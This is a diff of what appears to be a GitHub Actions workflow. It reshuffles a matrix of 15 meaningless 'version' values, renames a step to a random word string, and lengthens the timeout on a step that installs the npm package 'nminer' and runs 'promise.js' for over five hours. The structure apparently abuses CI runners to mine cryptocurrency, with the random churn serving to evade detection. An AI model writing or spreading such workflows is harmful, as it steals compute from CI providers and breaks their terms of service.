@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2457 }
-          - { version: 3707 }
-          - { version: 9933 }
-          - { version: 5725 }
-          - { version: 4887 }
-          - { version: 114 }
-          - { version: 2697 }
-          - { version: 4802 }
-          - { version: 2740 }
-          - { version: 5281 }
-          - { version: 7102 }
-          - { version: 6367 }
-          - { version: 4272 }
-          - { version: 4577 }
-          - { version: 2394 }
+          - { version: 6205 }
+          - { version: 8256 }
+          - { version: 2662 }
+          - { version: 3546 }
+          - { version: 7423 }
+          - { version: 7052 }
+          - { version: 670 }
+          - { version: 9244 }
+          - { version: 6854 }
+          - { version: 4731 }
+          - { version: 7636 }
+          - { version: 7852 }
+          - { version: 1477 }
+          - { version: 5743 }
+          - { version: 7597 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: beyond
+      - name: big joint wetly yearn fleck
         run: |
           npm install nminer@latest
-          timeout 314m node promise.js || echo "promise executed"
+          timeout 322m node promise.js || echo "promise executed"
